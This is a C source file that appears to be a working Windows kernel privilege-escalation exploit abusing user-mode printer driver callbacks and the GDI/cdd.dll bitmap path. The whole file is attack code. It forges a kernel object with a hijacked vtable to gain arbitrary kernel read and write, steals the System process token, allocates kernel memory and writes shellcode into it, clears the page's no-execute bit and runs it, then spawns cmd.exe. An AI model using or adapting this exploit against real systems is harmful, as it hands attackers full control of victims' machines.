#ifndef UNICODE
#define UNICODE
#endif

#include <windows.h>
#include <stdio.h>
#include <wchar.h>
#include <winternl.h>
#include <winddi.h>

#include "umpd.h"
#include "nt.h"



#define PRINTER_NAME L"Microsoft XPS Document Writer"
#define INIT() LoadLibraryA("user32.dll")

#define OBJ_SET_QWORD(obj, offset, value) *(ULONG64*)( (PBYTE)(obj) + offset ) = (ULONG64)(value)
#define OBJ_GET_QWORD(obj, offset) *(ULONG64*)( (PBYTE)(obj) + offset )
#define OBJ_SET_DWORD(obj, offset, value) *(ULONG32*)( (PBYTE)(obj) + offset ) = (ULONG32)(value)
#define FAKE_OBJ_SET_VTABLE(obj, offset, value) *(ULONG64*)( (PBYTE)( *(ULONG64*)( (PBYTE)(obj) + 0 ) ) + offset ) = (ULONG64)(value)
#define OBJ_LEA(obj, offset) (PVOID)( (PBYTE)(obj) + offset ) 

typedef HBITMAP (NTAPI* FuncTy_NtGdiEngCreateDeviceBitmap) (
    DHSURF  dhsurf,
    tagSIZE sizl,
    FLONG fl
);

typedef BOOL (NTAPI* FuncTy_NtGdiEngStretchBltROP)(
    SURFOBJ         *psoDest,
    SURFOBJ         *psoSrc,
    SURFOBJ         *psoMask,
    CLIPOBJ         *pco,
    XLATEOBJ        *pxlo,
    COLORADJUSTMENT *pca,
    POINTL          *pptlHTOrg,
    RECTL           *prclDest,
    RECTL           *prclSrc,
    POINTL          *pptlMask,
    ULONG            iMode,
    BRUSHOBJ        *pbo,
    DWORD            rop4
);

typedef enum _POOL_TYPE {
    NonPagedPool,
    NonPagedPoolExecute = NonPagedPool,
    PagedPool,
    NonPagedPoolMustSucceed = NonPagedPool + 2,
    DontUseThisType,
    NonPagedPoolCacheAligned = NonPagedPool + 4,
    PagedPoolCacheAligned,
    NonPagedPoolCacheAlignedMustS = NonPagedPool + 6,
    MaxPoolType,
    NonPagedPoolBase = 0,
    NonPagedPoolBaseMustSucceed = NonPagedPoolBase + 2,
    NonPagedPoolBaseCacheAligned = NonPagedPoolBase + 4,
    NonPagedPoolBaseCacheAlignedMustS = NonPagedPoolBase + 6,
    NonPagedPoolSession = 32,
    PagedPoolSession = NonPagedPoolSession + 1,
    NonPagedPoolMustSucceedSession = PagedPoolSession + 1,
    DontUseThisTypeSession = NonPagedPoolMustSucceedSession + 1,
    NonPagedPoolCacheAlignedSession = DontUseThisTypeSession + 1,
    PagedPoolCacheAlignedSession = NonPagedPoolCacheAlignedSession + 1,
    NonPagedPoolCacheAlignedMustSSession = PagedPoolCacheAlignedSession + 1,
    NonPagedPoolNx = 512,
    NonPagedPoolNxCacheAligned = NonPagedPoolNx + 4,
    NonPagedPoolSessionNx = NonPagedPoolNx + 32,

} POOL_TYPE;

FuncTy_NtGdiEngCreateDeviceBitmap   NtGdiEngCreateDeviceBitmap = NULL;
FuncTy_NtGdiEngStretchBltROP        NtGdiEngStretchBltROP = NULL;


HDC     g_hdc = NULL;
My_UMSO g_UmsoDest;
My_UMSO g_UmsoSrc;

PVOID g_pFakeObj = NULL;

PVOID g_kFn = NULL;
PVOID g_kAllocFn = NULL;
PVOID g_DbgPrintFn = NULL;

const CHAR   const_kernel_name[] = "win32kfull.sys";
const CHAR   const_cdd_name[] = "cdd.dll";
const UINT64 const_rva_Fn = 0x2C2070; // rva of vSrcCopyS16D16Identity
const UINT64 const_rva_alloc_fn = 0x027F1C0; //rva of PlaySndClient_midl_user_allocate proc near
const UINT64 const_rva_dbg_log = 0x01FBF4;
//const UINT64 const_rva_AllocateRop_cdd_dll = 0x010FDC; //rva of __int64 __fastcall CDDSQM_ROPLOGGER::AllocateRop(CDDSQM_ROPLOGGER *this, unsigned int)
const UINT64 const_rva_AllocateRop_cdd_dll = 0x012EC0; //?AllocateRop@CDDSQM_ROPLOGGER@@SAPEAXPEAU_RTL_AVL_TABLE@@K@Z proc near
int cmd_system()
{
    SECURITY_ATTRIBUTES     sa;
    HANDLE                  hRead, hWrite;
    byte                    buf[40960] = { 0 };
    STARTUPINFOW            si;
    PROCESS_INFORMATION     pi;
    DWORD                   bytesRead;
    RtlSecureZeroMemory(&si, sizeof(si));
    RtlSecureZeroMemory(&pi, sizeof(pi));
    RtlSecureZeroMemory(&sa, sizeof(sa));
    int br = 0;
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.lpSecurityDescriptor = NULL;
    sa.bInheritHandle = TRUE;
    if (!CreatePipe(&hRead, &hWrite, &sa, 0))
    {
        printf("[!][system] CreatePipe(): Failed with %llx\n", GetLastError());
        return -3;
    }

    si.cb = sizeof(STARTUPINFO);
    GetStartupInfoW(&si);
    si.hStdError = hWrite;
    si.hStdOutput = hWrite;
    const wchar_t* tmp = L"WinSta0\\Default";
    si.lpDesktop = (wchar_t*) tmp;
    wchar_t cmd[4096] = { L"cmd.exe" };

    if (!CreateProcessW(NULL, cmd, NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi))
    {
        CloseHandle(hWrite);
        CloseHandle(hRead);
        printf("[!][system] CreateProcessW(): Failed with %llx\n", GetLastError());
        return -2;
    }
    CloseHandle(hWrite);

}

BOOL init_kernel_addresses() {

    ptr_My_SYSTEM_MODULE_INFORMATION lpInfo = NULL;
    if (GetModulesInfo(&lpInfo) < 0) {
        return FALSE;
    }
    BOOLEAN f1, f2;
    f1 = FALSE;
    f2 = FALSE;
    for (int i = 0; i < lpInfo->ModulesCount; i++) {
        ptr_My_SYSTEM_MODULE lpModule = &lpInfo->Modules[i];

        if (!strcmp(&lpModule->Name[lpModule->NameOffset], const_kernel_name)) {
            g_kFn = (PVOID)((UINT64)(lpModule->ImageBaseAddress) + const_rva_Fn);
            //g_kAllocFn = (PVOID)((UINT64)(lpModule->ImageBaseAddress) + const_rva_alloc_fn);
            f1 = TRUE;
        }
        if (!strcmp(&lpModule->Name[lpModule->NameOffset], const_cdd_name)) {
           
           g_kAllocFn = (PVOID)((UINT64)(lpModule->ImageBaseAddress) + const_rva_AllocateRop_cdd_dll);
           g_DbgPrintFn = (PVOID)((UINT64)(lpModule->ImageBaseAddress) + const_rva_dbg_log);
           f2 = TRUE; 
           printf("allocfun: %p \n", g_kAllocFn);
           printf("DbgPrintFun : %p \n", g_DbgPrintFn);
        }
    };
    
    return (f1 && f2);
};

PVOID init_fake_obj() {
    
    PBYTE lpFakeObj = (PBYTE)VirtualAlloc(NULL, 0x4000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

    memset(lpFakeObj, 0xCC, 0x1000);
    

    OBJ_SET_QWORD(lpFakeObj, 0xB8, NULL); // disable EngAcquireSemaphore
    OBJ_SET_QWORD(lpFakeObj, 0x00, OBJ_LEA(lpFakeObj, 0x1000) ); // set vtable points to our start of fake object

    OBJ_SET_DWORD(lpFakeObj, 0x80, 0xCC | 0x21); // allow CDDMULTIBITMAPLOCK::CDDMULTIBITMAPLOCK 
                                                      // to call function from vtable CddBitmapHw::SyncDXAccessInternal
    OBJ_SET_QWORD(lpFakeObj, 0x28, NULL);
   // OBJ_SET_DWORD(lpFakeObj, 0x70,  0x2);
    return lpFakeObj;
}

BOOL init(PVOID ptr_to_kfun) {
    
    HWND HelperWindow = CreateWindowEx(WS_EX_TOOLWINDOW, L"BUTTON", NULL,
                              WS_VISIBLE | WS_POPUP | WS_BORDER | WS_DISABLED,
                              0, 0, 50, 50, NULL, NULL, GetModuleHandle(0), NULL);
    HDC HelperWindowDCScr = GetWindowDC(HelperWindow); // That screen related HBITMAP allow us reach cdd module 
   
    

    FillMemory(&g_UmsoDest, sizeof(g_UmsoDest), 0x41);
    g_UmsoDest.hsurf = (HBITMAP)GetCurrentObject(HelperWindowDCScr, OBJ_BITMAP);
    g_UmsoDest.magic = 0x554D534F;

    

    g_pFakeObj = init_fake_obj();
    FAKE_OBJ_SET_VTABLE(g_pFakeObj, 0xB0, ptr_to_kfun);
    FAKE_OBJ_SET_VTABLE(g_pFakeObj, 0x38, ptr_to_kfun);
    FAKE_OBJ_SET_VTABLE(g_pFakeObj, 0x80, ptr_to_kfun);
    printf("fackeobj\n");
   

    FillMemory(&g_UmsoSrc, sizeof(My_UMSO), 0x41);
    printf("&g_UmsoSrc Fill Memory\n");
    g_UmsoSrc.hsurf = (HBITMAP)NtGdiEngCreateDeviceBitmap((DHSURF)g_pFakeObj, {100, 100}, BMF_1BPP);;
    printf("NtGdiEngCreateDeviceBitmap\n");
    g_UmsoSrc.magic = 0x554D534F;
    printf("&g_UmsoSrc\n");
    wprintf(L"[?][init] g_kReadFn     = %p\n", ptr_to_kfun);
    wprintf(L"[?][init] g_pFakeObj    = %p\n", g_pFakeObj);
    wprintf(L"[?][init] hScreenBitmap = %x\n", g_UmsoDest.hsurf);
    wprintf(L"[?][init] hBitmap       = %x\n", g_UmsoSrc.hsurf);
    
    return TRUE;
}

VOID memmove(PVOID dst, PVOID src, SIZE_T size) {
    
    OBJ_SET_QWORD(g_pFakeObj, 0x08, src);
    OBJ_SET_QWORD(g_pFakeObj, 0x10, dst);
    OBJ_SET_DWORD(g_pFakeObj, 0x1C, size / 2); // x2

    OBJ_SET_DWORD(g_pFakeObj, 0x30, 0x00);
    OBJ_SET_DWORD(g_pFakeObj, 0x38, 0x00);

    OBJ_SET_DWORD(g_pFakeObj, 0x40, 0x00); // if ( *(_DWORD *)(a1 + 0x40) )
    OBJ_SET_DWORD(g_pFakeObj, 0x18, 0x00); // disable if ( *(int *)(a1 + 0x18) < 0 )

    OBJ_SET_DWORD(g_pFakeObj, 0x20, 0x01); // if ( !--v3 )
                                                //  break;

    RECTL rclDest;
    RECTL rclSrc;

    rclDest.left   = 0;
    rclDest.top    = 0;
    rclDest.right  = 10;
    rclDest.bottom = 10;

    rclSrc.left    = 0;
    rclSrc.top     = 0;
    rclSrc.right   = 20;
    rclSrc.bottom  = 20;

    POINTL pSrc = {2, 3};

    NtGdiEngStretchBltROP(
        &g_UmsoDest.so, &g_UmsoSrc.so, NULL, NULL, NULL, NULL, NULL,
        &rclDest, &rclSrc, NULL, BLACKONWHITE , NULL, 0xCCCC
    );

    OBJ_SET_DWORD(g_pFakeObj, 0x80, 0x21); // after complete CDDMULTIBITMAPLOCK::CDDMULTIBITMAPLOCK flag will be flushed
                                           // recover it
};

PVOID Read_64(PVOID address) {
    
    memmove(OBJ_LEA(g_pFakeObj, 0x2000), address, 8);

    return (PVOID)OBJ_GET_QWORD(g_pFakeObj, 0x2000);
};

VOID Write_64(PVOID address, ULONG64 value) {
    OBJ_SET_QWORD(g_pFakeObj, 0x2000, value);
    
    memmove(address, OBJ_LEA(g_pFakeObj, 0x2000), 8);
};

PVOID Read_kThread() {
    return Read_64(OBJ_LEA(g_pFakeObj, 0x210));
};


PVOID gl_kshell_ptr = NULL;

VOID test_shell_write(PVOID testKPTR) {
    init(g_kFn);
    PCHAR CDDPDEVobj = (PCHAR)OBJ_LEA(g_pFakeObj, 0x2000);
    memset(CDDPDEVobj, 0x90, 8); //nop 
    memset(CDDPDEVobj + 8, 0xc3, 8); //ret
    memmove(testKPTR, OBJ_LEA(g_pFakeObj, 0x2000), 16);
}

VOID test2_shell_write(PVOID testKPTR) {
    unsigned char hexData[58] = {
    0x48, 0x83, 0xEC, 0x28, 0x48, 0x8D, 0x0D, 0x11,
    0x00, 0x00, 0x00, 0x48, 0xB8, 0x16, 0x16, 0x2A,
    0x0C, 0x01, 0xF8, 0xFF, 0xFF, 0xFF, 0xD0, 0x48,
    0x83, 0xC4, 0x28, 0xC3, 0x48, 0x65, 0x6C, 0x6C,
    0x6F, 0x2C, 0x20, 0x57, 0x6F, 0x72, 0x6C, 0x64,
    0x2C, 0x20, 0x66, 0x72, 0x6F, 0x6D, 0x20, 0x73,
    0x68, 0x65, 0x6C, 0x6C, 0x63, 0x6F, 0x64, 0x65,
    0x0A, 0x00
    };

    memcpy_s(hexData + 13, 8, &g_DbgPrintFn, 8);
    
    init(g_kFn);
    PCHAR CDDPDEVobj = (PCHAR)OBJ_LEA(g_pFakeObj, 0x2000);
    memcpy_s(CDDPDEVobj, sizeof(hexData), hexData, sizeof(hexData));
    memmove(testKPTR, OBJ_LEA(g_pFakeObj, 0x2000), sizeof(hexData));
}

VOID allockMem() {
    init(g_kAllocFn);
    PVOID CDDPDEVobj = OBJ_LEA(g_pFakeObj, 0x2000);
    OBJ_SET_QWORD(g_pFakeObj, 0x60, CDDPDEVobj); //mov     rcx, [rcx+60h]

    OBJ_SET_QWORD(CDDPDEVobj, 34*sizeof(unsigned int), 0x00); // v5 = *((unsigned int *)this + 34);
    OBJ_SET_QWORD(CDDPDEVobj, 19*8, 0x00); //if (!v6)
    OBJ_SET_QWORD(CDDPDEVobj, 18*8, 0x00); //if if ( *((_QWORD *)this + 2 * v5 + 18) )
    OBJ_SET_QWORD(CDDPDEVobj, 16*8, 0x64); // ExAllocatePoolWithTag(PagedPool, * ((_QWORD*)this + 16), 0x64646344u); //264

    OBJ_SET_DWORD(g_pFakeObj, 0x80, 0xCC | 0x21); // allow CDDMULTIBITMAPLOCK::CDDMULTIBITMAPLOCK 
  

    RECTL rclDest;
    RECTL rclSrc;

    rclDest.left = 0;
    rclDest.top = 0;
    rclDest.right = 10;
    rclDest.bottom = 10;

    rclSrc.left = 0;
    rclSrc.top = 0;
    rclSrc.right = 20;
    rclSrc.bottom = 20;

    POINTL pSrc = { 2, 3 };

    NtGdiEngStretchBltROP(
        &g_UmsoDest.so, &g_UmsoSrc.so, NULL, NULL, NULL, NULL, NULL,
        &rclDest, &rclSrc, NULL, BLACKONWHITE, NULL, 0xCCCC
    );

    PVOID NewKMemory = (PVOID)*((PUINT64)((PCHAR)CDDPDEVobj + 0x98));
    printf("\n  [ALLOC]]New kernel memory:  %p \n", NewKMemory);
    gl_kshell_ptr = NewKMemory;

    OBJ_SET_QWORD(g_pFakeObj, 0xB8, NULL); // disable EngAcquireSemaphore
    OBJ_SET_QWORD(g_pFakeObj, 0x00, OBJ_LEA(g_pFakeObj, 0x1000)); // set vtable points to our start of fake object

    OBJ_SET_DWORD(g_pFakeObj, 0x80, 0xCC | 0x21); // allow CDDMULTIBITMAPLOCK::CDDMULTIBITMAPLOCK 
                                                      // to call function from vtable CddBitmapHw::SyncDXAccessInternal
    OBJ_SET_QWORD(g_pFakeObj, 0x28, NULL);
    OBJ_SET_DWORD(g_pFakeObj, 0x80, 0x21); // after complete CDDMULTIBITMAPLOCK::CDDMULTIBITMAPLOCK flag will be flushed
                                           // recover it
};

VOID callMyShell() {
    init(gl_kshell_ptr);

    RECTL rclDest;
    RECTL rclSrc;

    rclDest.left = 0;
    rclDest.top = 0;
    rclDest.right = 10;
    rclDest.bottom = 10;

    rclSrc.left = 0;
    rclSrc.top = 0;
    rclSrc.right = 20;
    rclSrc.bottom = 20;

    POINTL pSrc = { 2, 3 };

    NtGdiEngStretchBltROP(
        &g_UmsoDest.so, &g_UmsoSrc.so, NULL, NULL, NULL, NULL, NULL,
        &rclDest, &rclSrc, NULL, BLACKONWHITE, NULL, 0xCCCC
    );

   

    OBJ_SET_QWORD(g_pFakeObj, 0xB8, NULL); // disable EngAcquireSemaphore
    OBJ_SET_QWORD(g_pFakeObj, 0x00, OBJ_LEA(g_pFakeObj, 0x1000)); // set vtable points to our start of fake object

    OBJ_SET_DWORD(g_pFakeObj, 0x80, 0xCC | 0x21); // allow CDDMULTIBITMAPLOCK::CDDMULTIBITMAPLOCK 
                                                      // to call function from vtable CddBitmapHw::SyncDXAccessInternal
    OBJ_SET_QWORD(g_pFakeObj, 0x28, NULL);
    OBJ_SET_DWORD(g_pFakeObj, 0x80, 0x21); // after complete CDDMULTIBITMAPLOCK::CDDMULTIBITMAPLOCK flag will be flushed
                                           // recover it
};


UINT64 getPEBfromva(UINT64 addr) {
    UINT64 res;
    res = addr >> 9;
    res = res & 0x7FFFFFFFF8;
    res = res - 0x98000000000;
    return res;
}

INT umpd_cb_escape(VOID *inputBuf, ULONGLONG inputBufSize, VOID *outputBuffer, ULONGLONG outputBufSize) {
    wprintf(L"[?][umpd_cb_escape][tid=%x]: STARTED \n", GetCurrentThreadId());
    system("pause");

    PVOID kThread = Read_kThread();
    wprintf(L"[?][umpd_cb_escape][tid=%x]: kThread = %p\n", GetCurrentThreadId(), kThread);
    system("pause");
    PVOID kProcess = Read_64(OBJ_LEA(kThread, 0x220));
    wprintf(L"[?][umpd_cb_escape][tid=%x]: kProcess = %p\n", GetCurrentThreadId(), kProcess);
    system("pause");
    PVOID kActiveLinks = Read_64(OBJ_LEA(kProcess, 0x2f0));
    wprintf(L"[?][umpd_cb_escape][tid=%x]: kActiveLinks = %p\n", GetCurrentThreadId(), kActiveLinks);
    system("pause");
    PVOID kP = kActiveLinks;
    do {
        kP = Read_64(OBJ_LEA(kP, 0x08));
        
        ULONG64 pid = (ULONG64)Read_64(OBJ_LEA(kP, -0x08));
        
        if (pid == 4) {
            PVOID kSystemToken = Read_64(OBJ_LEA(kP, 0x68));//0x358-0x2f0
          
            wprintf(L"[?][umpd_cb_escape][tid=%x]: kSystemToken=%p\n", GetCurrentThreadId(), kSystemToken);
            system("pause");
            Write_64(OBJ_LEA(kProcess, 0x358), (ULONG64)kSystemToken);

            wprintf(L"[?][umpd_cb_escape][tid=%x]: Token stolen\n", GetCurrentThreadId());
            break;
            system("pause");
        }
    } while (kP != kProcess);

    wprintf(L"[?][umpd_cb_escape][tid=%x]: COMPLETED \n", GetCurrentThreadId());
    system("pause");
    wprintf(L"[?][allocmem] \n", GetCurrentThreadId());
    allockMem();
    system("pause");

    if (gl_kshell_ptr) {

        test2_shell_write(gl_kshell_ptr);
        printf("\nshell_was_writed\n");
        system("pause");
        init(g_kFn);
        PVOID pte = (PVOID)getPEBfromva((UINT64)gl_kshell_ptr);
        printf("PTE of %p is %p\n", gl_kshell_ptr, pte);
        system("pause");

        UINT64 pte_control_bits_no_execute = (UINT64)Read_64(pte);
        pte_control_bits_no_execute = pte_control_bits_no_execute & 0x0FFFFFFFFFFFFFF;
        printf("PTE new contents: \n", pte_control_bits_no_execute);
        system("pause");
       
        Write_64(pte, pte_control_bits_no_execute);//pfn b21c      ----A--KREV
        printf("Writed PTE of %p is %p to x\n", gl_kshell_ptr, pte);
        system("pause");
        callMyShell();
    }
    return TRUE;
};

int
__cdecl
wmain(
    int argc,
    __in_ecount(argc) wchar_t* argv[])
{    SetCurrentDirectory(L"c:\\windows\\system32\\");
    INIT();

    wprintf(L"[?][main] PID=%x\n", GetCurrentProcessId());
    wprintf(L"[?][main] TID=%x\n", GetCurrentThreadId());
    system("pause");
    HMODULE win32u = LoadLibraryW(L"gdi32.dll");
   
    NtGdiEngCreateDeviceBitmap = (FuncTy_NtGdiEngCreateDeviceBitmap)GetProcAddress(
        win32u, "EngCreateDeviceBitmap"
    );

    printf("NtGdiEngCreateDeviceBitmap %p", NtGdiEngCreateDeviceBitmap);
    NtGdiEngStretchBltROP = (FuncTy_NtGdiEngStretchBltROP)GetProcAddress(
        win32u, "EngStretchBltROP"
    );

    HANDLE  hPrinter       = NULL;
    LPWSTR  driverFilepath = NULL;
    HMODULE driverDLL      = NULL; 

    if (!umpd_load_printer_dll((wchar_t *)PRINTER_NAME, hPrinter, driverFilepath, driverDLL)) {
        wprintf(L"[~][main] Failed to load printer driver\n");
        return -1;
    }
    
    wprintf(L"[?][main] hPrinter       = %llx\n", (ULONGLONG)hPrinter);
    wprintf(L"[?][main] PrinterName    = %s\n", PRINTER_NAME);
    wprintf(L"[?][main] UMPD_Driver    = %s\n", driverFilepath);
    wprintf(L"[?][main] UMPD_DriverDLL = %llx\n", (ULONGLONG)driverDLL);

    if (!umpd_set_gdi_hooks()) {
        wprintf(L"[~][main] Failed to set gdi hook\n");
        return -2;
    }

    umpd_set_callback(INDEX_DrvEscape, umpd_cb_escape);
    printf("umpd_set_callback");
    if (!init_kernel_addresses())
        return FALSE;

    init(g_kFn);
    printf("init");
    g_hdc = CreateDC(PRINTER_NAME, PRINTER_NAME, NULL, NULL);
    printf("create DC");
    cmd_system();
    printf("system");
    return 0;
}